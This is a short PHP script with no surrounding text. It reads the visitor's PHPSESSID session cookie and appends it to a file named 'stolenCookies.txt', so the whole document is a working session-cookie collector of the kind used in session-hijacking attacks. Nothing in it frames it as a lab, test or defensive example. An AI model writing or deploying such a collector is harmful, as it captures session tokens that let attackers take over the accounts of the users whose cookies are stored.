<?php
$sessionID = $_COOKIE["PHPSESSID"];
$file = fopen("stolenCookies.txt", "a");
fwrite($file, $sessionID);
fclose($file);
?>
